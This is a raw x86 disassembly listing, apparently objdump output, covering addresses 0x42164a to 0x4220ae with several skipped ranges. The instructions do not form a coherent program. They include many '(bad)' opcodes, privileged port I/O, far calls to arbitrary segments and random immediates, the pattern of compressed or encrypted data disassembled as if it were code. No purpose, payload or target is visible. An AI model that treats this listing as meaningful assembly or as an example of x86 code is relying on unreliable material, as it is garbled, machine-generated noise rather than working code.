  42164a:	add    DWORD PTR [esi],ebx
  42164c:	xchg   BYTE PTR [eax+0x32],cl
  42164f:	sub    al,0xc
  421652:	in     al,dx
  421653:	mov    edx,0x875799e9
  421658:	mov    esp,0x430f2908
  42165d:	xor    ah,BYTE PTR es:[esi+0xd]
  421661:	retf   0x3ac2
  421664:	xchg   ecx,eax
  421665:	sub    edi,edi
  421667:	add    eax,0xc89d8dff
  42166c:	call   0x57c2b003
  421671:	jg     0x4216bd
  421673:	pop    esp
  421674:	out    dx,eax
  421675:	sub    ecx,DWORD PTR [ecx-0x60]
  421678:	ins    DWORD PTR es:[edi],dx
  421679:	ds jb  0x42165d
  42167c:	repz and bh,BYTE PTR [ebx-0x16f5de76]
  421683:	mov    ch,0xfd
  421685:	mov    ebp,0x6fddaf9b
  42168a:	adc    cl,BYTE PTR ds:0xe4cf4e2e
  421690:	lods   al,BYTE PTR ds:[esi]
  421691:	mov    ah,0xe7
  421693:	inc    esi
  421694:	or     DWORD PTR [ebx+eiz*8+0x20],eax
  421698:	mov    dl,0x64
  42169a:	push   esp
  42169b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42169c:	(bad)  
  42169d:	dec    eax
  42169e:	cmp    BYTE PTR [ebp-0x3d],cl
  4216a1:	and    ah,BYTE PTR [esi+esi*4+0x6d]
  4216a5:	data16 mov BYTE PTR [edx+0x6e],dl
  4216a9:	jmp    0x4216fe
  4216ab:	mov    dh,0x94
  4216ad:	cwde   
  4216ae:	or     DWORD PTR [edi-0x7e],0xfb53cbb1
  4216b5:	cmp    BYTE PTR [eax],ah
  4216b7:	pop    ebx
  4216b8:	mov    bh,0x12
  4216ba:	lahf   
  4216bb:	push   0x821cea88
  4216c0:	jb     0x421677
  4216c2:	shr    BYTE PTR [edx],1
  4216c4:	push   es
  4216c5:	aam    0xf
  4216c7:	sub    eax,0x12a234bc
  4216cc:	ds jnp 0x421713
  4216cf:	(bad)  
  4216d0:	mov    ecx,0xd9dd40d
  4216d5:	add    al,0x85
  4216d7:	push   0xcdcc09d6
  4216dc:	push   ecx
  4216dd:	sub    eax,0x8e8232c3
  4216e2:	repnz adc DWORD PTR [ebp-0x7abd2895],ebx
  4216e9:	jle    0x4216b2
  4216eb:	push   0x11
	...
  421754:	add    BYTE PTR [eax],al
  421756:	stos   DWORD PTR es:[edi],eax
  421757:	sub    al,0xed
  421759:	stos   BYTE PTR es:[edi],al
  42175a:	out    dx,eax
  42175b:	jmp    0x42174c
  42175d:	sub    eax,0xa3418669
  421762:	xor    BYTE PTR fs:[ebx+0x166d7f6],0x0
  42176a:	inc    DWORD PTR [eax]
  42176c:	add    BYTE PTR [eax],al
  42176e:	cmp    al,0xc7
  421770:	xchg   edx,eax
  421771:	aaa    
  421772:	scas   eax,DWORD PTR es:[edi]
  421773:	cs push esp
  421775:	push   cs
  421776:	iret   
  421777:	mov    cl,0xe9
  421779:	mov    al,0xa5
  42177b:	sub    al,ch
  42177d:	mov    esp,0xcadc0091
  421782:	cs xchg ebx,edi
  421785:	icebp  
  421786:	enter  0x2bd2,0x64
  42178a:	test   DWORD PTR [ebx+eax*4+0x22],ebp
  42178e:	dec    esi
  42178f:	pop    eax
  421790:	enter  0x6e4a,0xfe
  421794:	mov    eax,ds:0x560dda47
  421799:	idiv   BYTE PTR [edx]
  42179b:	xor    dl,BYTE PTR [edi]
  42179d:	jb     0x421786
  42179f:	out    dx,eax
  4217a0:	mov    ebp,0x4eacbd65
  4217a6:	imul   edx,DWORD PTR [edx+0x21eefcad],0xae4e20f9
  4217b0:	lds    eax,FWORD PTR fs:[esi]
  4217b3:	jne    0x4217d4
  4217b5:	jmp    0xde3a:0x5e4fa193
  4217bc:	imul   esp,DWORD PTR [edi+0x79d29faa],0xffffff97
  4217c3:	pop    ebp
  4217c4:	inc    ebp
  4217c5:	xchg   edi,eax
  4217c6:	inc    esi
  4217c7:	inc    eax
  4217c8:	xchg   esp,eax
  4217c9:	mov    esp,0xda1f1172
  4217ce:	pushf  
  4217cf:	out    0xe2,eax
  4217d1:	dec    esp
  4217d2:	mov    edx,0xff6ef157
  4217d7:	push   esi
  4217d8:	sub    esp,DWORD PTR [edi]
  4217da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4217db:	ds lahf 
  4217dd:	jno    0x42182f
  4217df:	mov    bl,0x88
  4217e1:	pop    ds
  4217e2:	adc    al,0x52
  4217e4:	(bad)
  4217e8:	out    dx,eax
  4217e9:	lods   al,BYTE PTR ds:[esi]
  4217ea:	inc    eax
  4217eb:	pop    eax
  4217ec:	call   0x875ddd21
  4217f1:	or     DWORD PTR [ecx+esi*2-0x3e19a411],esi
  4217f8:	(bad)  
  4217f9:	xor    BYTE PTR [esi-0x5dd11e73],ah
  4217ff:	and    al,BYTE PTR [edi]
  421801:	xor    BYTE PTR [edi+0x47],dh
  421804:	call   0x24d6:0x94f669f
  42180b:	shr    DWORD PTR [esi+0x3e],cl
  42180e:	stos   BYTE PTR es:[edi],al
  42180f:	xchg   esi,eax
  421810:	iret   
  421811:	dec    edi
  421812:	push   0xffffffee
  421814:	jbe    0x42188f
  421816:	add    eax,0x76a1359b
  42181b:	add    al,0x45
  42181d:	dec    ebp
  42181e:	imul   esp
  421820:	in     al,0xcd
  421822:	addr16 jmp 0x2a38:0x8565afc7
  42182a:	ins    DWORD PTR es:[edi],dx
  42182b:	out    0x4e,eax
  42182d:	sbb    eax,0xb32adb51
  421832:	test   eax,0xe9406a11
  421837:	adc    ebp,DWORD PTR [esi-0x1ccd40cb]
  42183d:	mov    esp,0xc005a3a9
  421842:	cmp    BYTE PTR [edi],0xae
  421845:	int3   
  421846:	jle    0x421807
  421848:	adc    eax,0x59fa8c48
  42184d:	(bad)  
  42184e:	jbe    0x42186a
  421850:	or     DWORD PTR [esi+eax*4],edi
  421853:	call   DWORD PTR [ebx]
  421855:	scas   eax,DWORD PTR es:[edi]
  421856:	aad    0x30
  421858:	and    dl,ah
  42185a:	mov    ebx,DWORD PTR [esi-0x2a9f6fb4]
  421860:	jmp    DWORD PTR [ecx-0xc]
  421863:	push   esp
  421864:	xchg   ecx,eax
  421865:	sub    al,0x91
  421867:	inc    esp
  421868:	push   ds
  421869:	mov    bl,0xb7
  42186b:	mov    DWORD PTR [edx+0x0],ecx
	...
  4218d6:	shl    DWORD PTR [eax-0x6061f47],1
  4218dc:	fnstenv [ecx-0x359a0174]
  4218e2:	daa    
  4218e3:	fsubr  QWORD PTR [ebx]
  4218e5:	outs   dx,DWORD PTR ds:[esi]
  4218e6:	(bad)  
  4218e7:	add    DWORD PTR [bx+si],eax
  4218ea:	inc    DWORD PTR [eax]
  4218ec:	add    BYTE PTR [eax],al
  4218ee:	adc    DWORD PTR [ebx+ebx*2-0x46],edx
  4218f2:	cld    
  4218f3:	ins    BYTE PTR es:[edi],dx
  4218f4:	push   eax
  4218f5:	mov    ds:0x7cf08d58,al
  4218fa:	cmp    al,BYTE PTR [esi-0x5e]
  4218fd:	sahf   
  4218fe:	mov    BYTE PTR [edi+0x103827df],ah
  421904:	mov    ch,0x48
  421906:	xchg   ebx,eax
  421907:	push   DWORD PTR [edi+0x1d]
  42190a:	not    BYTE PTR [esi]
  42190c:	or     eax,0x5248ddc
  421911:	cmp    cl,dl
  421913:	test   DWORD PTR [edx-0x3afccf05],eax
  421919:	data16 ss xor al,0x98
  42191d:	push   eax
  42191e:	add    bh,dl
  421920:	sub    ebp,ebx
  421922:	jns    0x4218d2
  421924:	adc    al,0x7
  421926:	fiadd  WORD PTR [esi+0x3c]
  421929:	push   0x590f3730
  42192e:	dec    ebp
  42192f:	bound  esp,QWORD PTR [ebp+0x3d10a8a9]
  421935:	dec    eax
  421936:	mov    cx,0x513
  42193a:	int3   
  42193b:	nop
  42193c:	push   es
  42193d:	cmp    ch,BYTE PTR [esi]
  42193f:	jg     0x4218ff
  421941:	mov    ah,0xf2
  421943:	outs   dx,BYTE PTR ds:[esi]
  421944:	add    ebp,ebx
  421946:	jo     0x42190d
  421948:	add    eax,DWORD PTR [ecx]
  42194a:	addr16 call 0xa14:0x5b515980
  421952:	sbb    DWORD PTR [edi],esi
  421954:	mov    dh,0x37
  421956:	cmp    eax,0xffe48676
  42195b:	retf   0x5407
  42195e:	xor    al,bh
  421960:	dec    esp
  421961:	out    0x40,eax
  421963:	repnz test DWORD PTR [esi-0x1d7a7298],ecx
  42196a:	scas   eax,DWORD PTR es:[edi]
  42196b:	imul   ecx,esi,0xdbe6835d
  421971:	adc    eax,0xd7d817e1
  421976:	cmc    
  421977:	pushf  
  421978:	pop    ss
  421979:	fnstenv [ecx+0xb66368a]
  42197f:	xchg   BYTE PTR [ecx],dh
  421981:	mov    edx,gs
  421983:	dec    ebp
  421984:	cmp    dl,BYTE PTR [esi]
  421986:	inc    esp
  421987:	rcl    esp,1
  421989:	daa    
  42198a:	sub    DWORD PTR [esi],eax
  42198c:	out    0x3a,al
  42198e:	lods   al,BYTE PTR ds:[esi]
  42198f:	cmp    al,BYTE PTR ds:0x65c816b7
  421995:	repnz add al,0xe3
  421998:	mov    esi,DWORD PTR [ebp-0x7a624fa1]
  42199e:	fst    QWORD PTR [ebx+esi*2+0xa]
  4219a2:	fstp   TBYTE PTR [edi+0x36]
  4219a5:	mov    eax,ds:0x4e18dce8
  4219aa:	jne    0x42193f
  4219ac:	int    0x2b
  4219ae:	xor    BYTE PTR ds:[ebx],dl
  4219b1:	addr16 bnd jo 0x4219c1
  4219b5:	std    
  4219b6:	xor    eax,0xd663bb20
  4219bb:	push   esi
  4219bc:	js     0x4219f1
  4219be:	cmp    al,0xab
  4219c0:	adc    ch,BYTE PTR [ebx]
  4219c2:	std    
  4219c3:	and    edx,DWORD PTR [eax]
  4219c5:	mov    dh,0x48
  4219c7:	jecxz  0x4219ee
  4219c9:	loopne 0x4219a4
  4219cb:	enter  0x7092,0xc8
  4219cf:	and    al,0x57
  4219d1:	jle    0x4219d6
  4219d3:	pop    esp
  4219d4:	xor    al,0x9b
  4219d6:	js     0x421a33
  4219d8:	add    BYTE PTR [ebx-0x1726b895],0x27
  4219df:	cmc    
  4219e0:	cdq    
  4219e1:	pop    ebp
  4219e2:	jo     0x42197a
  4219e4:	lea    edx,[ebx-0x41]
  4219e7:	repnz rcr DWORD PTR [ebp-0x27],cl
  4219eb:	stos   BYTE PTR es:[edi],al
  4219ec:	loope  0x4219ee
	...
  421a56:	(bad)  
  421a57:	cld    
  421a58:	je     0x421a77
  421a5a:	jbe    0x4219f9
  421a5c:	(bad)  
  421a5d:	(bad)  
  421a5e:	jns    0x421a50
  421a60:	sbb    al,0x7b
  421a62:	rcr    bl,1
  421a64:	xor    BYTE PTR [ecx],dl
  421a66:	aad    0x68
  421a68:	add    DWORD PTR [eax],eax
  421a6a:	inc    DWORD PTR [eax]
  421a6c:	add    BYTE PTR [eax],al
  421a6e:	jae    0x421ac9
  421a70:	loope  0x421aa6
  421a72:	ins    DWORD PTR es:[edi],dx
  421a73:	std    
  421a74:	sub    DWORD PTR [esp+ebx*4-0x5c002e79],0xffffffa4
  421a7c:	lds    eax,FWORD PTR [ecx-0x2e]
  421a7f:	mov    ds:0xf93db605,al
  421a84:	xor    ah,al
  421a86:	and    esp,DWORD PTR ds:0x573c805a
  421a8c:	cmp    al,0x85
  421a8e:	sbb    al,0x1d
  421a91:	jbe    0x421a78
  421a93:	scas   al,BYTE PTR es:[edi]
  421a94:	lods   eax,DWORD PTR ds:[esi]
  421a95:	dec    ebp
  421a96:	gs or  al,0xe2
  421a99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421a9a:	in     eax,0x84
  421a9c:	sub    eax,0x105825bb
  421aa1:	xlat   BYTE PTR ds:[ebx]
  421aa2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421aa3:	stos   DWORD PTR es:[edi],eax
  421aa4:	ins    DWORD PTR es:[edi],dx
  421aa5:	repz sub al,0xa1
  421aa8:	enter  0xddd7,0xed
  421aac:	sbb    ch,BYTE PTR [edi+ebp*2]
  421aaf:	lock enter 0x1cc8,0xff
  421ab4:	xchg   esp,eax
  421ab5:	std    
  421ab6:	pusha  
  421ab7:	mov    esp,ecx
  421ab9:	fistp  DWORD PTR ds:0xe767c16a
  421abf:	dec    eax
  421ac0:	retf   0xc22e
  421ac3:	push   eax
  421ac4:	jle    0x421b22
  421ac6:	test   al,0x3d
  421ac8:	sub    al,0x6e
  421aca:	dec    bx
  421acc:	jns    0x421b18
  421ace:	jge    0x421af1
  421ad0:	mov    ch,0x0
  421ad2:	icebp  
  421ad3:	dec    ecx
  421ad4:	(bad)  
  421ad6:	out    0x43,al
  421ad8:	cmp    dh,cl
  421ada:	gs dec eax
  421adc:	das    
  421add:	jge    0x421b44
  421adf:	dec    eax
  421ae0:	xchg   edx,eax
  421ae1:	int3   
  421ae2:	out    dx,al
  421ae3:	fwait
  421ae4:	sbb    BYTE PTR ds:0xd5fe37a2,cl
  421aea:	push   0xffffffe9
  421aec:	frstor [ebx]
  421aee:	std    
  421aef:	dec    eax
  421af0:	jmp    0x421ad1
  421af2:	jbe    0x421ae0
  421af4:	mov    ecx,0x41aa7109
  421af9:	syscall 
  421afb:	lahf   
  421afc:	iret   
  421afd:	sub    ebx,DWORD PTR [edx+0x6c]
  421b00:	pop    edx
  421b01:	les    eax,FWORD PTR [esi-0x29]
  421b04:	fist   DWORD PTR [ecx+ecx*4+0x7c1ea37f]
  421b0b:	push   edi
  421b0c:	mov    al,dh
  421b0e:	cwde   
  421b0f:	pop    ebp
  421b10:	mov    WORD PTR [ebx],es
  421b12:	xor    al,0x96
  421b14:	outs   dx,DWORD PTR ds:[esi]
  421b15:	or     ebp,DWORD PTR [edi]
  421b17:	push   ds
  421b18:	sub    eax,0x858c066e
  421b1d:	arpl   ax,cx
  421b1f:	pushf  
  421b20:	sar    DWORD PTR [ecx-0x9],cl
  421b23:	(bad)  [edi+eax*4+0x6a]
  421b27:	mov    dl,BYTE PTR [esi+edi*4]
  421b2a:	sahf   
  421b2b:	mov    ds:0x33b5a8d0,al
  421b30:	xchg   edx,eax
  421b31:	stos   BYTE PTR es:[edi],al
  421b32:	mov    ecx,0xf8badcaa
  421b37:	lahf   
  421b38:	sbb    BYTE PTR [eax-0x53],ah
  421b3b:	aaa    
  421b3c:	fwait
  421b3d:	add    BYTE PTR [ebx+ebp*8-0x7e139140],0x8d
  421b45:	test   al,0x18
  421b47:	mov    ds:0x8426340b,al
  421b4c:	push   esp
  421b4d:	mov    bh,0xc7
  421b4f:	xor    ebp,DWORD PTR [esi]
  421b51:	dec    ebp
  421b52:	xor    al,0xf8
  421b54:	aas    
  421b55:	xor    eax,0xd4c5f3b0
  421b5a:	ss xor eax,0x48c794ab
  421b60:	repnz std 
  421b62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421b63:	sbb    al,0x98
  421b65:	xor    bl,BYTE PTR [ecx+eiz*1]
  421b68:	lods   al,BYTE PTR ds:[esi]
  421b69:	call   0x0:0xc2c5db
	...
  421bd4:	add    BYTE PTR [eax],al
  421bd6:	push   ss
  421bd7:	cdq    
  421bd8:	jmp    0x37400baa
  421bdd:	fild   DWORD PTR [ecx+eax*8+0x28]
  421be1:	or     dl,BYTE PTR [esi-0x2bd4edc4]
  421be7:	imul   eax,DWORD PTR [ecx],0xff00
  421bed:	add    BYTE PTR [ebx+0x25b0b3a5],dl
  421bf3:	inc    esi
  421bf4:	shl    BYTE PTR [esi],cl
  421bf6:	xchg   ebp,eax
  421bf7:	push   ebx
  421bf8:	adc    al,0x54
  421bfa:	fsub   DWORD PTR [ebp+0x57]
  421bfd:	(bad)
  421c00:	cwde   
  421c01:	pushf  
  421c02:	pop    ebp
  421c03:	jae    0x421bcd
  421c05:	(bad)
  421c08:	in     al,dx
  421c09:	inc    ecx
  421c0a:	cwde   
  421c0b:	loopne 0x421bbe
  421c0d:	ret    0xfccf
  421c10:	adc    BYTE PTR ss:[ecx+0x15],dl
  421c14:	shl    DWORD PTR [edx],0x38
  421c17:	pop    esi
  421c18:	sub    ch,BYTE PTR [ecx-0x1aa65e0e]
  421c1e:	lods   al,BYTE PTR ds:[esi]
  421c1f:	retf   0x5ddf
  421c22:	mov    eax,0x627718e5
  421c27:	pop    esp
  421c28:	push   cs
  421c29:	adc    eax,0xddf5caae
  421c2e:	test   al,0x49
  421c30:	or     edi,esp
  421c32:	mov    ebp,0x4ae7c06
  421c37:	fwait
  421c38:	pop    ss
  421c39:	es and al,0x83
  421c3c:	int3   
  421c3d:	inc    ebx
  421c3e:	jnp    0x421be7
  421c40:	mov    BYTE PTR [edx+eax*1],dh
  421c43:	inc    esp
  421c44:	retf   
  421c45:	pop    ds
  421c46:	shr    cx,1
  421c49:	imul   eax,DWORD PTR [eax+0x72562832],0x4c36d841
  421c53:	and    dh,al
  421c55:	stc    
  421c56:	bound  ebx,QWORD PTR [ebp+eax*8+0x4404568a]
  421c5d:	std    
  421c5e:	mov    esi,0x69e7a98d
  421c63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c64:	leave  
  421c65:	adc    esp,edi
  421c67:	repnz add BYTE PTR [eax+0x3f70ecd1],ch
  421c6e:	sub    bl,BYTE PTR [ecx+0x6]
  421c71:	mov    ah,0xff
  421c73:	xlat   BYTE PTR ds:[ebx]
  421c74:	push   edx
  421c75:	mov    DWORD PTR [esi+0x56],ebx
  421c78:	mov    esp,0x1d078cc1
  421c7d:	sbb    al,dh
  421c7f:	jl     0x421c7f
  421c81:	pushf  
  421c82:	fsubr  DWORD PTR [ebx]
  421c84:	cli    
  421c85:	fs dec ebp
  421c87:	adc    dh,bh
  421c89:	fidivr WORD PTR [ecx-0x78a1c794]
  421c8f:	cmp    eax,0x224f6e16
  421c94:	arpl   WORD PTR [eax+0x44],bp
  421c97:	iret   
  421c98:	fst    DWORD PTR [ebp+0x39]
  421c9b:	xchg   edi,ebx
  421c9d:	sbb    esi,edi
  421c9f:	stc    
  421ca0:	scas   al,BYTE PTR es:[edi]
  421ca1:	lahf   
  421ca2:	out    dx,eax
  421ca3:	pop    esp
  421ca4:	popf   
  421ca5:	retf   
  421ca6:	and    al,0x3b
  421ca8:	retf   0x9fdc
  421cab:	adc    DWORD PTR [edx],esi
  421cad:	add    al,BYTE PTR [esi]
  421caf:	xor    ch,BYTE PTR [ecx-0x3776aee3]
  421cb5:	push   edi
  421cb6:	enter  0xd803,0xd0
  421cba:	cdq    
  421cbb:	sub    dh,cl
  421cbd:	jne    0x421cbf
  421cbf:	dec    ebx
  421cc0:	adc    esp,edi
  421cc2:	popf   
  421cc3:	jb     0x421d42
  421cc5:	iret   
  421cc6:	aad    0x58
  421cc8:	jl     0x421cd3
  421cca:	and    ch,ch
  421ccc:	dec    esi
  421ccd:	add    dl,al
  421ccf:	push   eax
  421cd0:	(bad)  
  421cd1:	or     eax,0x1add844c
  421cd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421cd7:	(bad)  
  421cd8:	mov    dl,0x5d
  421cda:	xchg   ebp,eax
  421cdb:	add    eax,DWORD PTR [bp+si-0x17]
  421cdf:	lods   eax,DWORD PTR ds:[esi]
  421ce0:	or     BYTE PTR [eax+eax*4-0x7ec0fd1e],dh
  421ce7:	pop    ebp
  421ce8:	mov    dh,BYTE PTR [ebx+0x5b936e]
	...
  421d56:	mov    al,0x6b
  421d58:	mov    ch,0xe5
  421d5a:	(bad)  
  421d5b:	push   eax
  421d5d:	jg     0x421db3
  421d5f:	dec    edi
  421d60:	xchg   edx,eax
  421d61:	dec    edi
  421d62:	mov    ebx,fs
  421d64:	daa    
  421d65:	mov    dl,0xd3
  421d67:	push   0x1
  421d69:	add    bh,bh
  421d6b:	add    BYTE PTR [eax],al
  421d6d:	add    bl,al
  421d6f:	sti    
  421d70:	pop    edx
  421d71:	pop    edx
  421d72:	aas    
  421d73:	or     eax,0x1fbf9874
  421d78:	xor    ebp,DWORD PTR [eax+ecx*4]
  421d7b:	dec    edi
  421d7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d7d:	push   ebx
  421d7e:	pop    edx
  421d7f:	mov    cl,0x84
  421d81:	cmp    BYTE PTR [esi+eiz*8],bh
  421d84:	jle    0x421d0f
  421d86:	cmp    DWORD PTR [edi-0x2d],ebx
  421d89:	js     0x421dac
  421d8b:	lahf   
  421d8c:	ss ja  0x421db8
  421d8f:	inc    ebp
  421d90:	cmc    
  421d91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d92:	jne    0x421e0d
  421d94:	and    ecx,DWORD PTR [ebp-0x33]
  421d97:	int    0xf
  421d99:	jb     0x421d41
  421d9b:	push   esp
  421d9c:	jbe    0x421dba
  421d9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d9f:	adc    BYTE PTR [ecx],dl
  421da1:	sub    bh,BYTE PTR [ebx+0x4f597edb]
  421da7:	push   edx
  421da8:	sub    eax,0xa0107422
  421dad:	fdivr  st,st(4)
  421daf:	add    BYTE PTR ds:0x76f118b1,dl
  421db5:	dec    edx
  421db6:	add    ebp,DWORD PTR [ebp-0x31]
  421db9:	cld    
  421dba:	xor    dh,BYTE PTR [ebp*4+0x5bca20c5]
  421dc1:	xchg   edx,eax
  421dc2:	xchg   edi,eax
  421dc3:	cmc    
  421dc4:	dec    eax
  421dc5:	scas   al,BYTE PTR es:[di]
  421dc7:	push   es
  421dc8:	cmp    al,0x24
  421dca:	out    0x5d,eax
  421dcc:	(bad)  
  421dcd:	inc    edi
  421dce:	push   ebp
  421dcf:	repz lea edx,gs:[ebp-0x71d37d0a]
  421dd7:	jno    0x421d73
  421dd9:	mov    dl,0xef
  421ddb:	jp     0x421e4d
  421ddd:	sbb    DWORD PTR [esi-0x70f34c2a],esp
  421de3:	cmc    
  421de4:	inc    ecx
  421de5:	jmp    0x8e1bcb62
  421dea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421deb:	jb     0x421de8
  421ded:	adc    dh,cl
  421def:	cmc    
  421df0:	jae    0x421dc1
  421df2:	ror    DWORD PTR ss:0x71aa84c,cl
  421df9:	dec    edi
  421dfa:	mov    ah,0xd6
  421dfc:	pop    esp
  421dfd:	shl    dl,1
  421dff:	(bad)  
  421e00:	aam    0xb7
  421e02:	adc    bl,BYTE PTR [ecx+0x728b1c8f]
  421e08:	dec    esp
  421e09:	lods   al,BYTE PTR ds:[esi]
  421e0a:	lock mov esp,0x772bbe43
  421e10:	pop    ss
  421e11:	dec    esp
  421e12:	adc    ah,BYTE PTR [eax]
  421e14:	xorps  xmm0,xmm7
  421e17:	add    dl,BYTE PTR [esi+0x2f6d9eda]
  421e1d:	jo     0x421da1
  421e1f:	mov    esp,fs
  421e21:	mov    WORD PTR ds:0x3e77d830,ds
  421e27:	sub    al,cl
  421e29:	mov    dh,0x6f
  421e2b:	inc    edx
  421e2c:	jns    0x421e43
  421e2e:	sbb    al,0x98
  421e30:	jg     0x421e9b
  421e32:	mov    cs,WORD PTR [esi-0x4207e44a]
  421e38:	das    
  421e39:	inc    esp
  421e3a:	push   esi
  421e3b:	inc    ebx
  421e3c:	ins    BYTE PTR es:[edi],dx
  421e3d:	daa    
  421e3e:	jb     0x421e6c
  421e40:	adc    DWORD PTR [edi+ebx*4-0x97eadde],eax
  421e47:	jb     0x421ea3
  421e49:	pop    eax
  421e4a:	push   ecx
  421e4b:	add    ah,BYTE PTR [eax]
  421e4d:	sbb    BYTE PTR [ebp+0x6c],bl
  421e50:	xor    ebp,DWORD PTR [edx+0xe58b855]
  421e56:	pop    edx
  421e57:	mov    ds:0xe23039de,eax
  421e5c:	or     DWORD PTR [eax+0x322944f7],0xff5a1db7
  421e66:	les    esi,FWORD PTR [edx-0x5dc9d8b9]
  421e6c:	(bad)  
	...
  421ed5:	add    bh,cl
  421ed7:	mov    eax,ds:0xbf7f851b
  421edc:	fucomip st,st(3)
  421ede:	push   es
  421edf:	ins    BYTE PTR es:[edi],dx
  421ee0:	xor    al,0xb9
  421ee2:	in     al,0x6c
  421ee4:	in     eax,dx
  421ee5:	call   0xff:0x16bd2
  421eec:	add    BYTE PTR [eax],al
  421eee:	xlat   BYTE PTR ds:[ebx]
  421eef:	test   al,0xc5
  421ef1:	inc    ebx
  421ef2:	enter  0xef39,0x77
  421ef6:	xchg   ecx,eax
  421ef7:	and    edi,DWORD PTR [edx]
  421ef9:	daa    
  421efa:	fwait
  421efb:	pop    edx
  421efc:	out    0x92,eax
  421efe:	lds    ebp,FWORD PTR [ecx-0xb80a862]
  421f04:	sub    DWORD PTR [esi-0x17a2d7f4],esp
  421f0a:	in     eax,dx
  421f0b:	jne    0x421ece
  421f0d:	cmp    BYTE PTR [edi],ah
  421f0f:	or     dl,dl
  421f11:	mov    es,WORD PTR [eax+eiz*8]
  421f14:	xchg   ecx,eax
  421f15:	push   0xd5d0c55e
  421f1a:	dec    esi
  421f1b:	and    al,0xdd
  421f1d:	mov    esi,0x79359e49
  421f22:	pop    ds
  421f23:	scas   al,BYTE PTR es:[edi]
  421f24:	lds    eax,FWORD PTR [edi*4+0xbc0ac34]
  421f2b:	or     BYTE PTR [ecx+0x5],0x57
  421f2f:	mov    ebp,0x34686dab
  421f34:	and    al,0x17
  421f36:	fdiv   DWORD PTR [edx]
  421f38:	sahf   
  421f39:	in     eax,dx
  421f3a:	inc    esp
  421f3b:	dec    ebp
  421f3c:	in     eax,dx
  421f3d:	mov    ebp,0xfb813a80
  421f42:	pop    esp
  421f43:	cmp    eax,0x419687df
  421f48:	inc    edi
  421f49:	shl    BYTE PTR [edi-0x4b],cl
  421f4c:	add    al,0xfb
  421f4e:	fist   WORD PTR [edx+eax*2+0x64]
  421f52:	(bad)  
  421f53:	adc    bl,bh
  421f55:	adc    BYTE PTR [edi+0x3e],al
  421f58:	cmp    BYTE PTR [esi],bl
  421f5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f5b:	mov    BYTE PTR [edi],bl
  421f5d:	inc    esp
  421f5e:	pop    ebx
  421f5f:	dec    edx
  421f60:	jge    0x421f5b
  421f62:	(bad)  
  421f63:	imul   esi,DWORD PTR [edi-0x2d2a2518],0xc9c23885
  421f6d:	push   cs
  421f6e:	outs   dx,BYTE PTR ds:[esi]
  421f6f:	fst    DWORD PTR [edx]
  421f71:	pusha  
  421f72:	adc    al,0xbb
  421f74:	mov    DWORD PTR [eax],esi
  421f76:	mov    esp,DWORD PTR [eax+0x685052ed]
  421f7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421f7d:	addr16 dec edx
  421f7f:	push   eax
  421f80:	rol    dl,cl
  421f82:	mov    al,0xb0
  421f84:	pop    esp
  421f85:	mov    dl,BYTE PTR [edi+0x2e]
  421f88:	jl     0x421f71
  421f8a:	mov    ds:0x489cf91f,al
  421f8f:	lods   al,BYTE PTR ds:[esi]
  421f90:	inc    ecx
  421f91:	adc    BYTE PTR [edx+0x3fd1fb],dl
  421f97:	cmp    BYTE PTR [ebx-0x65],dh
  421f9a:	cmp    ecx,DWORD PTR [ebp-0x41]
  421f9d:	fimul  DWORD PTR [esi+0x747fb2f6]
  421fa3:	neg    DWORD PTR [edi-0x6dab75a]
  421fa9:	push   cs
  421faa:	sub    al,0xe7
  421fac:	fst    DWORD PTR [ecx+0x6b6db636]
  421fb2:	ja     0x421f64
  421fb4:	sbb    ecx,DWORD PTR [esi-0x51130a23]
  421fba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421fbb:	jg     0x42202e
  421fbd:	add    al,0xac
  421fbf:	mov    esi,0xd964a678
  421fc4:	je     0x42203a
  421fc6:	pop    ebx
  421fc7:	mov    ebx,0x16ec3641
  421fcc:	lock pop esi
  421fce:	test   DWORD PTR [edi-0x4d4d12a5],edx
  421fd4:	pusha  
  421fd5:	mov    ds:0x8d303123,eax
  421fda:	xor    al,0xe7
  421fdc:	mov    edx,0x88ed13f7
  421fe1:	aam    0x45
  421fe3:	shl    esp,0xd7
  421fe6:	xlat   BYTE PTR ds:[ebx]
  421fe7:	into   
  421fe8:	cld    
  421fe9:	jmp    DWORD PTR [eax+0x15e9]
	...
  422053:	add    BYTE PTR [eax],al
  422055:	add    BYTE PTR [ebx+0x6],ch
  422058:	(bad)  
  422059:	dec    edi
  42205a:	out    dx,eax
  42205b:	iret   
  42205c:	jmp    0x422084
  42205e:	aas    
  42205f:	in     eax,dx
  422060:	push   es
  422061:	data16 ffree st(0)
  422064:	and    eax,0x16cd154
  422069:	add    bh,bh
  42206b:	add    BYTE PTR [eax],al
  42206d:	add    BYTE PTR [ebp+0x29d70458],bh
  422073:	inc    ebp
  422074:	xor    DWORD PTR [ecx+0x1b38ecf5],edx
  42207a:	mov    DWORD PTR [edi],ebp
  42207c:	xor    al,0xdb
  42207e:	lahf   
  42207f:	fnstcw WORD PTR [eax+0x51fc0643]
  422085:	push   edi
  422086:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422087:	sahf   
  422088:	mov    al,0xd1
  42208a:	inc    eax
  42208b:	mov    cl,0x7
  42208d:	cmp    bl,BYTE PTR [edi+0x4d3858a4]
  422093:	outs   dx,DWORD PTR ds:[esi]
  422094:	cwde   
  422095:	xchg   edx,eax
  422096:	mov    ecx,0x58eb9a02
  42209b:	jl     0x422079
  42209d:	jne    0x4220da
  42209f:	int3   
  4220a0:	jmp    0x422035
  4220a2:	ss pop si
  4220a5:	mov    bl,0xa5
  4220a7:	daa    
  4220a8:	push   ss
  4220a9:	aaa    
  4220aa:	cld    
  4220ab:	xchg   esi,eax
  4220ac:	test   bl,bh
  4220ae:	fcom   DWORD PTR [edi+ebp*8-0x4f]
